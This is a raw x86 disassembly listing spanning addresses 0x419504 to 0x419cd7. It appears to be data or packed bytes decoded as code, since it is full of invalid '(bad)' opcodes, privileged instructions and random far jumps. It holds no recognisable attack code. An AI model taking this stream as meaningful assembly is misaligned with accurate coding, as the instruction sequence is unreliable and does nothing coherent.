  419504:	xor    edx,DWORD PTR [eax]
  419506:	sub    DWORD PTR [ecx-0x1fca6da8],esi
  41950c:	es clc 
  41950e:	enter  0xf961,0x0
  419512:	and    al,0xaf
  419514:	fadd   QWORD PTR [ecx]
  419516:	or     DWORD PTR [eax+edi*1+0x53],0xffffff9e
  41951b:	lods   al,BYTE PTR ds:[esi]
  41951c:	dec    edx
  41951d:	mov    ecx,0xbe2e8b1d
  419522:	jae    0x419533
  419524:	inc    BYTE PTR [edx]
  419526:	add    dl,BYTE PTR [eax-0x45]
  419529:	pop    esi
  41952a:	cld    
  41952b:	dec    ebp
  41952c:	pop    ebx
  41952d:	addr16 mov cl,ah
  419530:	inc    esp
  419531:	adc    dh,BYTE PTR [edi-0x421cf0eb]
  419537:	inc    esi
  419538:	cwde   
  419539:	push   0xed257918
  41953e:	leave  
  41953f:	out    dx,al
  419540:	pushf  
  419541:	mov    esp,0x64042566
  419546:	iret   
  419547:	ficom  WORD PTR [edi-0x38]
  41954a:	cmc    
  41954b:	mov    WORD PTR [ecx],?
  41954d:	sbb    al,0x74
  41954f:	mov    ah,0x20
  419551:	pop    ebx
  419552:	xor    eax,0x79126579
  419557:	mov    ebp,es
  419559:	mov    esi,0x82562b5e
  41955e:	inc    edi
  41955f:	mov    ebx,0x97248fd9
  419564:	stos   BYTE PTR es:[edi],al
  419565:	push   ebp
  419566:	shr    al,0x71
  419569:	adc    eax,0x6c27e0e9
  41956e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41956f:	or     dl,BYTE PTR [edx-0x60]
  419572:	lock pop edi
  419574:	(bad)  
  419575:	push   ss
  419576:	lock retf 
  419578:	and    DWORD PTR [ebp+0x1f],eax
  41957b:	dec    esi
  41957c:	mov    ebx,0x31140d5
  419581:	(bad)  
  419582:	test   eax,0xa2d0aee3
  419587:	not    BYTE PTR [edx]
  419589:	stos   DWORD PTR es:[edi],eax
  41958a:	dec    ebp
  41958b:	data16 jge 0x419599
  41958e:	or     DWORD PTR [ebx-0x62],edi
  419591:	fidiv  DWORD PTR [esi+0x2a97fd07]
  419597:	pop    ss
  419598:	xchg   esp,eax
  419599:	sub    edx,eax
  41959b:	cli    
  41959c:	sub    BYTE PTR [eax-0x58],bl
  41959f:	mov    ebp,0xbf5e892f
  4195a4:	and    al,0x99
  4195a6:	cmp    eax,0x8c05c7c0
  4195ab:	jp     0x419591
  4195ad:	mov    ds,WORD PTR [ecx]
  4195af:	int    0xf3
  4195b1:	jge    0x419548
  4195b3:	cmp    DWORD PTR es:[eax-0x70],esp
  4195b7:	dec    ecx
  4195b8:	xchg   ecx,eax
  4195b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195ba:	push   cs
  4195bb:	mov    edi,es
  4195bd:	and    ebx,DWORD PTR [ebx-0x34]
  4195c0:	xlat   BYTE PTR ds:[ebx]
  4195c1:	stc    
  4195c2:	and    ah,BYTE PTR [ecx-0x1f426195]
  4195c8:	clc    
  4195c9:	mov    esi,0xedf8ebeb
  4195ce:	add    DWORD PTR [eax-0x71],ebp
  4195d1:	adc    bh,BYTE PTR [ebx+0x67]
  4195d4:	pushf  
  4195d5:	test   eax,0xa17b3c
  4195da:	ror    cl,0x3e
  4195dd:	jmp    FWORD PTR [ebp-0x48]
  4195e0:	imul   edi,DWORD PTR [ecx+0x33],0x3d018c7f
  4195e7:	fild   WORD PTR [edx]
  4195e9:	dec    ebx
  4195ea:	add    ebp,esi
  4195ec:	xchg   ebx,eax
  4195ed:	mov    ebx,0x66f8f5ba
  4195f2:	pop    ebx
  4195f3:	cld    
  4195f4:	retf   
  4195f5:	daa    
  4195f6:	push   cs
  4195f7:	mov    ss,ebp
  4195f9:	xlat   BYTE PTR ds:[ebx]
  4195fa:	add    al,0xa
  4195fc:	mov    bl,0x17
  4195fe:	(bad)  
  4195ff:	xchg   edi,eax
  419600:	mov    ds:0x2e052bcf,al
  419605:	fistp  WORD PTR [ebx-0x22]
  419608:	jg     0x419608
  41960a:	cdq    
  41960b:	push   ecx
  41960c:	xor    BYTE PTR [ecx+0x39],0x2d
  419610:	aaa    
  419611:	(bad)  
  419612:	aas    
  419613:	xchg   esi,eax
  419614:	xchg   edi,eax
  419615:	push   es
  419616:	popa   
  419617:	adc    esp,DWORD PTR [ebp+0x78]
  41961a:	ror    BYTE PTR [esi+0x18],cl
  41961d:	mov    ebx,0x69b8a106
  419622:	add    dl,BYTE PTR [ebx]
  419624:	xor    eax,edi
  419626:	dec    edx
  419627:	pop    esi
  419628:	mov    esi,0x32150156
  41962d:	out    0xca,eax
  41962f:	push   0x71
  419631:	push   esi
  419632:	frstpm(287 only) 
  419634:	ss sub bl,bh
  419637:	xchg   ebx,eax
  419638:	jecxz  0x41962b
  41963a:	or     esp,ecx
  41963c:	iret   
  41963d:	sbb    esp,edx
  41963f:	das    
  419640:	or     cl,BYTE PTR [ebp+0x1bd7703b]
  419646:	rol    BYTE PTR [esi],cl
  419648:	jns    0x4195d3
  41964a:	in     eax,0xa3
  41964c:	mov    es:0x32b60382,eax
  419652:	(bad)  
  419653:	daa    
  419654:	mov    dh,0x85
  419656:	out    dx,eax
  419657:	mov    WORD PTR [edx-0x79],?
  41965a:	sahf   
  41965b:	scas   eax,DWORD PTR es:[edi]
  41965c:	inc    eax
  41965d:	neg    DWORD PTR [edi+0x46]
  419660:	dec    edi
  419661:	push   cs
  419662:	iret   
  419663:	cs dec edi
  419665:	jmp    0x4645:0xc145b889
  41966c:	dec    edi
  41966d:	xchg   ebx,eax
  41966e:	xchg   edx,eax
  41966f:	mov    DWORD PTR cs:[ebp+0x4d],0x7a195dbb
  419677:	test   al,0xda
  419679:	dec    edi
  41967a:	int    0x5
  41967c:	mov    DWORD PTR [esi+0x73ad6e97],edx
  419682:	jb     0x4196b2
  419684:	sub    BYTE PTR [edx],dh
  419686:	rcr    BYTE PTR [edx+esi*2+0x6b],cl
  41968a:	outs   dx,DWORD PTR ds:[esi]
  41968b:	pop    ecx
  41968c:	retf   0x1233
  41968f:	test   eax,0xd5cbed0d
  419694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419695:	mov    ebx,0x94f2d293
  41969a:	push   0xde328c9c
  41969f:	(bad)  
  4196a1:	scas   al,BYTE PTR es:[edi]
  4196a2:	mov    bl,0x30
  4196a4:	ret    
  4196a5:	sti    
  4196a6:	push   ds
  4196a7:	lock aaa 
  4196a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196aa:	fsubr  st,st(0)
  4196ac:	bound  edi,QWORD PTR [eax+0x26]
  4196af:	(bad)  
  4196b0:	jnp    0x4196c4
  4196b2:	sub    DWORD PTR [ecx],edx
  4196b4:	pushf  
  4196b5:	fimul  DWORD PTR [ecx]
  4196b8:	mov    ch,0x2
  4196ba:	mov    ah,0xc9
  4196bc:	push   edi
  4196bd:	je     0x4196fd
  4196bf:	lea    edx,[ebp-0x13303a30]
  4196c5:	add    esp,edi
  4196c7:	(bad)  
  4196c9:	pop    esp
  4196ca:	sub    DWORD PTR [ecx+0x20],edi
  4196cd:	inc    eax
  4196ce:	cld    
  4196cf:	xchg   DWORD PTR [esi],esp
  4196d1:	mov    DWORD PTR [ecx],esi
  4196d3:	cld    
  4196d4:	and    eax,0x5b05747e
  4196d9:	aam    0x6
  4196db:	loope  0x4196be
  4196dd:	dec    esi
  4196de:	jo     0x41966e
  4196e0:	lods   al,BYTE PTR ds:[esi]
  4196e1:	das    
  4196e2:	loope  0x4196fd
  4196e4:	jb     0x419761
  4196e6:	in     eax,0xf
  4196e8:	and    bl,BYTE PTR [esi+0x6]
  4196eb:	rcl    DWORD PTR [edi+0x64ca6c37],0x3b
  4196f2:	mov    cl,BYTE PTR [edi+eax*4]
  4196f5:	daa    
  4196f6:	cmp    ebp,DWORD PTR [eax-0x55f892f4]
  4196fc:	xchg   esp,eax
  4196fd:	fst    DWORD PTR [esi+edi*4-0x199412ab]
  419704:	and    bl,BYTE PTR [edx+ebx*1-0x5a]
  419708:	call   0xd62dad3a
  41970d:	out    0x50,al
  41970f:	inc    ecx
  419710:	test   eax,0x73fc8971
  419715:	inc    ecx
  419716:	sub    al,al
  419718:	sbb    al,0xd2
  41971a:	sbb    DWORD PTR [esi+edx*4-0x30ef3bd6],eax
  419721:	repz ss in eax,dx
  419724:	js     0x41977f
  419726:	aas    
  419727:	xchg   edx,eax
  419728:	ds mov esp,0x69af7816
  41972e:	pop    gs
  419730:	ror    DWORD PTR [edi-0x64db0c1c],0x32
  419737:	xchg   edx,eax
  419738:	jl     0x4197a7
  41973a:	ins    BYTE PTR es:[edi],dx
  41973b:	and    eax,0x63b6acf5
  419740:	jae    0x419733
  419742:	inc    ecx
  419743:	xchg   dl,bh
  419745:	lea    edx,[ebx+0x2b]
  419748:	fcmovbe st,st(5)
  41974a:	mov    esp,0xc3c468b0
  41974f:	xchg   esp,eax
  419750:	cmp    DWORD PTR [eax+0x30],esp
  419753:	iret   
  419754:	cs push esi
  419756:	mov    cl,0x16
  419758:	push   edi
  419759:	(bad)  
  41975a:	(bad)  
  41975b:	fidivr WORD PTR [esi]
  41975d:	jle    0x419713
  41975f:	mov    eax,0x776f8f48
  419764:	or     ah,BYTE PTR [esi+ecx*8-0x66]
  419768:	stos   BYTE PTR es:[edi],al
  419769:	jne    0x419726
  41976b:	mov    al,ds:0xb6d93ba7
  419770:	nop
  419771:	(bad)  
  419772:	bound  ecx,QWORD PTR [ebx]
  419774:	push   eax
  419775:	add    edi,DWORD PTR [edx+0x46]
  419778:	pop    ss
  419779:	xor    esi,ecx
  41977b:	jmp    0x4197f5
  41977d:	lea    edx,ds:[edi+0x3f]
  419781:	fcomp  DWORD PTR ds:0x717a7a2
  419787:	rol    BYTE PTR [edi],cl
  419789:	(bad)  
  41978a:	daa    
  41978b:	and    edi,DWORD PTR [esi]
  41978d:	fucom  st(6)
  41978f:	icebp  
  419790:	not    DWORD PTR [edi+0x7b50b0d3]
  419796:	daa    
  419797:	sahf   
  419798:	mov    eax,0x3709bc11
  41979d:	mov    dl,al
  41979f:	pop    esi
  4197a0:	fistp  WORD PTR [ebx-0x7d7fbdd5]
  4197a6:	or     DWORD PTR [esi-0x100c59a],0x5684961
  4197b0:	adc    bh,BYTE PTR [eax-0x16]
  4197b3:	inc    BYTE PTR [eax+0x5bb6a331]
  4197b9:	push   ecx
  4197ba:	sub    BYTE PTR [ecx-0x5f088556],ah
  4197c0:	sub    eax,0xa753bc
  4197c5:	pop    eax
  4197c6:	push   edi
  4197c7:	shr    DWORD PTR [edi],cl
  4197c9:	jmp    0x1b3997c8
  4197ce:	in     al,dx
  4197cf:	sub    al,0x4f
  4197d1:	and    DWORD PTR [esi],0xa894bea7
  4197d7:	or     eax,0x69a0cc3a
  4197dc:	mov    al,ds:0xf42cd323
  4197e1:	or     dl,cl
  4197e3:	jne    0x41979d
  4197e5:	adc    ebx,DWORD PTR [ecx+edx*4]
  4197e8:	mov    ch,0x75
  4197ea:	sahf   
  4197eb:	shr    bl,1
  4197ed:	jmp    0x41978f
  4197ef:	inc    edi
  4197f0:	js     0x419812
  4197f2:	cmp    edi,edx
  4197f4:	cmp    al,0xd5
  4197f6:	dec    ecx
  4197f7:	sbb    BYTE PTR [esi-0x25],ch
  4197fa:	rol    BYTE PTR ss:[edx],1
  4197fd:	sbb    ch,BYTE PTR [edx]
  4197ff:	fld    TBYTE PTR [ebx-0x23044f58]
  419805:	push   ebx
  419806:	in     eax,0x50
  419808:	div    bh
  41980a:	rcr    BYTE PTR [edx],0x71
  41980d:	push   ss
  41980e:	cmp    edx,esi
  419810:	addr16 mov eax,fs
  419813:	mov    al,ds:0xfe896d70
  419818:	fsub   QWORD PTR [edx]
  41981a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41981b:	outs   dx,BYTE PTR ds:[esi]
  41981c:	cmc    
  41981d:	jg     0x419873
  41981f:	sbb    DWORD PTR [ebx+0x43d05621],0xaf241a1b
  419829:	xchg   bx,ax
  41982b:	clc    
  41982c:	and    DWORD PTR [ebx+0x7f],edi
  41982f:	lahf   
  419830:	and    al,0x9
  419832:	mov    ecx,DWORD PTR [esi+edi*4-0x4f8dfd4a]
  419839:	or     eax,0x350bea80
  41983e:	loop   0x419807
  419840:	push   ebx
  419841:	adc    eax,0x50a75b4
  419846:	pushf  
  419847:	mov    eax,ds:0xc3029b6f
  41984c:	mov    BYTE PTR [esi+edx*8-0x74],al
  419850:	sub    esp,DWORD PTR [ebx]
  419852:	addr16 or eax,ebx
  419855:	and    DWORD PTR [esi+0x65b2f7],esi
  41985b:	test   BYTE PTR [eax+0x32],ch
  41985e:	sar    BYTE PTR [edx-0x39],cl
  419861:	dec    edx
  419862:	shl    DWORD PTR [eax+0x35],0x40
  419866:	js     0x4197f6
  419868:	jecxz  0x419841
  41986a:	retf   
  41986b:	or     eax,0xca334f7e
  419870:	push   cs
  419871:	nop
  419872:	fdiv   st,st(5)
  419874:	xor    ch,BYTE PTR [ecx-0x5b]
  419877:	mov    edx,0x8305e185
  41987c:	data16 fwait
  41987e:	pop    edx
  41987f:	mov    esi,0x2f02fae5
  419884:	jno    0x4198a0
  419886:	xchg   DWORD PTR [edi+edi*2+0x5c638b6f],ebp
  41988d:	push   ss
  41988e:	int3   
  41988f:	icebp  
  419890:	(bad)  
  419892:	cdq    
  419893:	cmp    DWORD PTR [eax],esp
  419895:	nop
  419896:	test   bl,0x2
  419899:	mov    ecx,0x15858c9
  41989e:	mov    dh,0xe2
  4198a0:	add    cl,al
  4198a2:	xor    BYTE PTR [ebp+0x30],dh
  4198a5:	out    dx,eax
  4198a6:	idiv   DWORD PTR [ebp+0x44]
  4198a9:	push   ecx
  4198aa:	mov    bh,0x4a
  4198ac:	out    dx,al
  4198ad:	cmp    eax,0xb5aa4afc
  4198b2:	xchg   esp,eax
  4198b3:	das    
  4198b4:	(bad)  
  4198b5:	xchg   esp,eax
  4198b6:	mov    dh,0x87
  4198b8:	jns    0x4198f8
  4198ba:	and    DWORD PTR [ecx+0x1f9f48b4],esi
  4198c0:	mov    ds:0xfda00b9e,eax
  4198c5:	(bad)  
  4198c6:	xchg   ebp,eax
  4198c7:	xchg   BYTE PTR [ebp-0x17],bl
  4198ca:	icebp  
  4198cb:	pop    ecx
  4198cc:	dec    ax
  4198ce:	aaa    
  4198cf:	lock call 0x954e:0xb2667cf4
  4198d7:	test   BYTE PTR [esi-0x76d5ee3a],bh
  4198dd:	mov    fs,WORD PTR [esi]
  4198df:	and    ah,dh
  4198e1:	scas   al,BYTE PTR es:[edi]
  4198e2:	jne    0x4198b8
  4198e4:	aaa    
  4198e5:	test   BYTE PTR [eax],al
  4198e7:	out    dx,al
  4198e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198e9:	ss mov dl,0x2c
  4198ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198ed:	xor    DWORD PTR [esi],edi
  4198ef:	ficomp DWORD PTR [edx-0x79]
  4198f2:	fnsave [edx]
  4198f4:	sahf   
  4198f5:	lock jle 0x4198c2
  4198f8:	jns    0x419905
  4198fa:	inc    edx
  4198fb:	mov    ah,0x7d
  4198fd:	dec    esp
  4198fe:	imul   ebx,DWORD PTR [edx+edi*4],0x6bf540e3
  419905:	aaa    
  419906:	xchg   BYTE PTR [edx-0x7f773cd2],bh
  41990c:	inc    esi
  41990d:	xchg   edi,eax
  41990e:	xchg   esi,eax
  41990f:	mov    al,ds:0xf81b91d8
  419914:	(bad)  
  419915:	sub    DWORD PTR [ebp-0xb],edx
  419918:	push   0x3b590313
  41991d:	ret    
  41991e:	jge    0x419905
  419920:	push   esi
  419921:	mov    dh,0x6
  419923:	jecxz  0x419981
  419925:	cmp    al,0x33
  419927:	imul   BYTE PTR [edx]
  419929:	cmp    eax,0x353c40cf
  41992e:	mov    esp,0xeaa8e588
  419933:	fidiv  DWORD PTR [ebx]
  419935:	mov    ds:0x798f4686,al
  41993a:	pop    ebx
  41993b:	sbb    esi,eax
  41993d:	std    
  41993e:	arpl   WORD PTR [edx+0xa],di
  419941:	fidiv  DWORD PTR [ecx+eiz*1+0x5]
  419945:	pop    es
  419946:	or     bl,BYTE PTR [edx-0x42970ee8]
  41994c:	daa    
  41994d:	mov    al,0x63
  41994f:	add    ebp,DWORD PTR [edi]
  419951:	push   cs
  419952:	mov    bh,0x5e
  419954:	leave  
  419955:	retf   
  419956:	nop
  419957:	call   0x4011:0x53cf6247
  41995e:	mov    dh,BYTE PTR [esi+ebx*8+0x21bd2f94]
  419965:	jns    0x4199a4
  419967:	rcr    cl,0xc1
  41996a:	addr16 call 0x9171:0x4a7b2c0e
  419972:	shr    dh,1
  419974:	push   cs
  419975:	or     ecx,DWORD PTR [esi]
  419977:	fs out 0x6d,al
  41997a:	fwait
  41997b:	sbb    al,BYTE PTR [eax]
  41997d:	das    
  41997e:	imul   ecx,ecx,0x62
  419981:	shl    DWORD PTR [eax+0x4e],0xee
  419985:	push   ss
  419986:	(bad)  
  419988:	xchg   esp,eax
  419989:	ins    DWORD PTR es:[edi],dx
  41998a:	dec    esp
  41998b:	xor    al,0x30
  41998d:	inc    eax
  41998e:	mov    al,ds:0x57bdbabd
  419993:	call   0x9be:0xf9d419b0
  41999a:	retf   
  41999b:	adc    cl,ch
  41999d:	lahf   
  41999e:	adc    al,0xff
  4199a0:	addr16 jg 0x419965
  4199a3:	add    al,0x8e
  4199a5:	or     bl,BYTE PTR [edi-0x654c81f6]
  4199ab:	dec    edi
  4199ac:	add    DWORD PTR [ebp-0x7e],0xaf7b829d
  4199b3:	imul   esi,DWORD PTR [ecx+0x33],0xffffff8e
  4199b7:	mov    edx,0x17996029
  4199bc:	mov    DWORD PTR [edi-0x19],esi
  4199bf:	out    0xb2,al
  4199c1:	mov    ebp,0xb62e8428
  4199c6:	fcmovnu st,st(2)
  4199c8:	adc    eax,0xf67fee4d
  4199cd:	dec    esp
  4199ce:	push   ecx
  4199cf:	fwait
  4199d0:	(bad)  
  4199d1:	mov    bh,0x88
  4199d3:	push   ebx
  4199d4:	enter  0x97da,0xa7
  4199d8:	repnz push edx
  4199da:	cmp    ebx,DWORD PTR [ebx+ecx*1-0x49]
  4199de:	adc    al,0x61
  4199e0:	push   esp
  4199e1:	xchg   edx,eax
  4199e2:	pop    esp
  4199e3:	pop    ebx
  4199e4:	mov    al,ds:0xb5f91ff
  4199e9:	and    BYTE PTR [edi+0x70],ch
  4199ec:	popa   
  4199ed:	xor    DWORD PTR [esi+0x67b3a739],0x51847246
  4199f7:	adc    eax,0xa20e0353
  4199fc:	cmc    
  4199fd:	mov    esp,DWORD PTR [esi]
  4199ff:	adc    edx,ebx
  419a01:	outs   dx,BYTE PTR ds:[esi]
  419a02:	sub    eax,0x553f1719
  419a07:	push   0xfdcd908f
  419a0c:	mov    ebp,0xe9fb09fd
  419a11:	ins    DWORD PTR es:[edi],dx
  419a12:	imul   edx,DWORD PTR [edi+0x7],0xffffffb1
  419a16:	cmp    BYTE PTR [edx+eax*8],ah
  419a19:	retf   
  419a1a:	pushf  
  419a1b:	jb     0x4199bc
  419a1d:	jns    0x419a66
  419a1f:	xchg   ebx,eax
  419a20:	scas   al,BYTE PTR es:[edi]
  419a21:	xchg   edi,eax
  419a22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a23:	repz xor esi,DWORD PTR [edi+0x1f052c61]
  419a2a:	sub    DWORD PTR [edi+eiz*4],0x5ef97463
  419a31:	fistp  QWORD PTR [edi]
  419a33:	mov    bl,0xdd
  419a35:	add    ebx,DWORD PTR [ecx]
  419a37:	or     DWORD PTR [ebp-0x6989a7d7],esi
  419a3d:	sub    edi,DWORD PTR [ecx]
  419a3f:	xlat   BYTE PTR ds:[ebx]
  419a40:	imul   edi,DWORD PTR [eax],0xdd0532
  419a46:	fcomip st,st(5)
  419a48:	sbb    dl,dh
  419a4a:	das    
  419a4b:	ins    BYTE PTR es:[edi],dx
  419a4c:	aaa    
  419a4d:	out    dx,eax
  419a4e:	fldenv [esi+0x21ee2da0]
  419a54:	popa   
  419a55:	sbb    al,0xd1
  419a57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a58:	stos   BYTE PTR es:[edi],al
  419a59:	sub    al,0xe
  419a5b:	mov    dl,0x47
  419a5d:	bound  eax,QWORD PTR [edi]
  419a5f:	xchg   edx,eax
  419a60:	shl    DWORD PTR [esi-0x20871a13],1
  419a66:	out    0xbf,al
  419a68:	test   BYTE PTR gs:[edi-0x5bcc3457],bh
  419a6f:	or     eax,0x4e2f4d8c
  419a74:	jmp    0x419a54
  419a76:	xchg   ebp,eax
  419a77:	or     ecx,DWORD PTR [ecx-0x7f]
  419a7a:	scas   al,BYTE PTR es:[edi]
  419a7b:	scas   al,BYTE PTR es:[edi]
  419a7c:	sbb    eax,edi
  419a7e:	add    ebp,ecx
  419a80:	leave  
  419a81:	push   cs
  419a82:	test   BYTE PTR [edi-0x24d6e102],dl
  419a88:	scas   al,BYTE PTR es:[edi]
  419a89:	ins    DWORD PTR es:[edi],dx
  419a8a:	lea    ebx,[ebp+0x42]
  419a8d:	enter  0x630b,0xe4
  419a91:	inc    DWORD PTR [esi-0x67]
  419a94:	inc    ecx
  419a95:	sti    
  419a96:	cmp    ah,0x4a
  419a99:	mov    bl,0xfb
  419a9b:	xchg   edi,eax
  419a9c:	push   edi
  419a9d:	les    ecx,FWORD PTR [edx+0x44189bf1]
  419aa3:	xchg   ebx,eax
  419aa4:	js     0x419a8a
  419aa6:	adc    DWORD PTR [eax],eax
  419aa8:	pop    ebp
  419aa9:	sbb    eax,0xae2211d0
  419aae:	push   cs
  419aaf:	mov    ah,0xa9
  419ab1:	sbb    eax,0x5136d0e5
  419ab6:	mov    bh,0x1a
  419ab8:	arpl   WORD PTR [esi+0x53],ax
  419abb:	(bad)  
  419abd:	dec    ecx
  419abe:	fimul  DWORD PTR [ebx+eiz*2]
  419ac1:	lds    edi,FWORD PTR [ebx]
  419ac3:	jbe    0x419b27
  419ac5:	jbe    0x419ab9
  419ac7:	cli    
  419ac8:	inc    ebp
  419ac9:	inc    esp
  419aca:	dec    eax
  419acb:	jno    0x419a7b
  419acd:	push   esi
  419ace:	jbe    0x419b0c
  419ad0:	and    ebx,DWORD PTR [ebp+0x2700209e]
  419ad6:	clc    
  419ad7:	pusha  
  419ad8:	push   ss
  419ad9:	stos   BYTE PTR es:[edi],al
  419ada:	(bad)  
  419adb:	or     dl,BYTE PTR [ecx-0x27c355ef]
  419ae1:	or     al,0xaa
  419ae3:	mov    esp,ss
  419ae5:	(bad)  
  419ae6:	ret    
  419ae7:	mov    ebx,0xf854bdf4
  419aec:	push   edi
  419aed:	sti    
  419aee:	or     bl,BYTE PTR [esi]
  419af0:	push   cs
  419af1:	int    0x72
  419af3:	loopne 0x419b38
  419af5:	ins    DWORD PTR es:[edi],dx
  419af6:	inc    edx
  419af7:	mov    ds:0x5c518001,eax
  419afc:	cmp    DWORD PTR ds:0x3968fd2b,ebp
  419b02:	and    bh,bl
  419b04:	xlat   BYTE PTR ds:[ebx]
  419b05:	xor    eax,0xeb73f189
  419b0a:	xor    esi,ebx
  419b0c:	jbe    0x419b80
  419b0e:	xchg   ebx,eax
  419b0f:	xchg   BYTE PTR [ebx-0x2106a5e0],ch
  419b15:	adc    al,0xaf
  419b17:	jle    0x419b16
  419b19:	mov    dl,BYTE PTR [ebp-0x4a4ed842]
  419b1f:	push   esi
  419b20:	sysret 
  419b22:	jns    0x419ad2
  419b24:	call   0xe20d:0xf9fc526e
  419b2b:	mov    ebx,0xe5d2d4a0
  419b30:	pop    ds
  419b31:	pop    edx
  419b32:	xchg   DWORD PTR [ebx+0x18],esi
  419b35:	mov    bh,0x33
  419b37:	(bad)  
  419b38:	out    dx,al
  419b39:	out    dx,eax
  419b3a:	and    ecx,0xcc46b96c
  419b40:	push   ecx
  419b41:	add    eax,0x451fb919
  419b46:	ja     0x419bc5
  419b48:	setp   BYTE PTR [eax+ebp*8+0x1a]
  419b4d:	xor    DWORD PTR [edx],esi
  419b4f:	xchg   esp,eax
  419b50:	push   esp
  419b51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b52:	in     eax,0xa2
  419b54:	hlt    
  419b55:	push   edi
  419b56:	xor    ch,bh
  419b58:	mov    bh,0x96
  419b5a:	jns    0x419b10
  419b5c:	pop    eax
  419b5d:	repz mov ds:0xae954e52,al
  419b63:	in     eax,dx
  419b64:	sub    ebx,DWORD PTR [eax]
  419b66:	rcr    DWORD PTR [edi+0x11],0xad
  419b6a:	or     BYTE PTR [ebp-0x2548eae8],0x94
  419b71:	imul   edi,DWORD PTR [ebp+ecx*4+0x3c368ea8],0x9fc21cac
  419b7c:	xor    BYTE PTR [edi-0x9],0x25
  419b80:	jo     0x419bb0
  419b82:	out    0x25,al
  419b84:	lock mov al,ds:0x568f2ff9
  419b8a:	popa   
  419b8b:	jno    0x419bc4
  419b8d:	pushf  
  419b8e:	xchg   BYTE PTR [edi+0x3810de47],cl
  419b94:	(bad)  
  419b95:	mov    ds:0x6e097cea,al
  419b9a:	mov    ds:0x539a2591,eax
  419b9f:	push   cs
  419ba0:	icebp  
  419ba1:	push   es
  419ba2:	loop   0x419bd4
  419ba4:	imul   ebp,edx,0xff1ddcda
  419baa:	mov    ebx,0x988e723c
  419baf:	and    dl,0x89
  419bb2:	adc    BYTE PTR [edi],al
  419bb4:	ja     0x419bde
  419bb6:	cmp    al,0x82
  419bb8:	mov    WORD PTR [esi+eiz*2-0x3cd303a3],ds
  419bbf:	xchg   edi,eax
  419bc0:	mov    dh,BYTE PTR [ecx+0x57]
  419bc3:	cwde   
  419bc4:	stos   BYTE PTR es:[edi],al
  419bc5:	(bad)  
  419bc6:	ds push 0x7062245b
  419bcc:	cmp    eax,0x8861f903
  419bd1:	push   0x17445d1c
  419bd6:	out    0xfd,al
  419bd8:	nop
  419bd9:	(bad)
  419bdc:	hlt    
  419bdd:	jmp    0xab4d7841
  419be2:	xchg   eax,esp
  419be4:	push   es
  419be5:	jae    0x419c03
  419be7:	fidiv  DWORD PTR [eax-0x13f54cf4]
  419bed:	push   0xf61a13e9
  419bf2:	in     eax,0x1d
  419bf4:	pop    ebp
  419bf5:	pop    edi
  419bf6:	cmp    dh,BYTE PTR [esi-0x79]
  419bf9:	sbb    eax,0x2317aa6a
  419bfe:	retf   
  419bff:	mov    ebx,0xf2379b73
  419c04:	sti    
  419c05:	in     al,dx
  419c06:	and    ecx,DWORD PTR [ebx-0x5d71078e]
  419c0c:	arpl   WORD PTR [ebp-0x8095ca2],bp
  419c12:	clc    
  419c13:	out    0x95,eax
  419c15:	(bad)  
  419c17:	into   
  419c18:	push   ebx
  419c19:	fsubr  DWORD PTR ds:0xc9d4e1ca
  419c1f:	daa    
  419c20:	push   ss
  419c21:	add    DWORD PTR [esi-0x66f4859a],ebx
  419c27:	xchg   ecx,eax
  419c28:	pop    ecx
  419c29:	stc    
  419c2a:	sub    dl,BYTE PTR [eax+0xf]
  419c2d:	push   edx
  419c2e:	es sub al,0xfc
  419c31:	mov    esp,esp
  419c33:	hlt    
  419c34:	daa    
  419c35:	and    edx,esi
  419c37:	(bad)  
  419c38:	jecxz  0x419c08
  419c3a:	popa   
  419c3b:	xor    ebp,DWORD PTR [edx+esi*4-0x6b1591b0]
  419c42:	inc    eax
  419c43:	cli    
  419c44:	mov    ds:0xe9b501b0,al
  419c49:	and    al,0x1b
  419c4b:	fdiv   st,st(1)
  419c4d:	add    ecx,DWORD PTR [ecx-0x5c]
  419c50:	mov    BYTE PTR [ecx],ah
  419c52:	xlat   BYTE PTR ds:[ebx]
  419c53:	rol    DWORD PTR [eax+0x62894619],1
  419c59:	retf   0xe1eb
  419c5c:	popf   
  419c5d:	shl    ebx,1
  419c5f:	call   0x5b36:0x6da7d5ea
  419c66:	mov    ds:0x53a76aea,al
  419c6b:	loopne 0x419ce8
  419c6d:	sbb    eax,DWORD PTR [edx+0x2a]
  419c70:	mov    eax,0x336102a9
  419c75:	jnp    0x419cc1
  419c77:	push   cs
  419c78:	mov    esi,0x324101c9
  419c7d:	imul   ecx,edx,0x6e
  419c80:	jle    0x419c49
  419c82:	stos   DWORD PTR es:[edi],eax
  419c83:	shl    bl,1
  419c85:	add    edx,DWORD PTR [edx+0x6bc11a26]
  419c8b:	rcl    ebx,cl
  419c8d:	add    bh,BYTE PTR [esi+0x31b43ba7]
  419c93:	popf   
  419c94:	xor    al,BYTE PTR [ebx]
  419c96:	retf   0x7ede
  419c99:	mov    DWORD PTR [ebx],0xf20377d0
  419c9f:	es ret 0x93ca
  419ca3:	jns    0x419c48
  419ca5:	push   edi
  419ca6:	xchg   edx,eax
  419ca7:	mov    WORD PTR [esi],ss
  419ca9:	xchg   esp,eax
  419caa:	inc    ebx
  419cab:	stc    
  419cac:	out    0x97,eax
  419cae:	sbb    dh,0xdb
  419cb1:	jne    0x419ce6
  419cb3:	jno    0x419c5c
  419cb5:	repz shl esi,1
  419cb8:	push   0xffffffcb
  419cba:	sub    esp,ebp
  419cbc:	mov    bl,0xb3
  419cbe:	dec    eax
  419cbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cc0:	pop    edx
  419cc1:	in     eax,dx
  419cc2:	sub    DWORD PTR [ecx+0x37],edx
  419cc5:	inc    esi
  419cc6:	add    dl,dh
  419cc8:	clc    
  419cc9:	(bad)  
  419cca:	repz loope 0x419c68
  419ccd:	add    BYTE PTR [ebx+0x4e],cl
  419cd0:	repnz adc DWORD PTR [edi-0x49fd2c4d],esp
  419cd7:	mov    edx,0xf511c18a
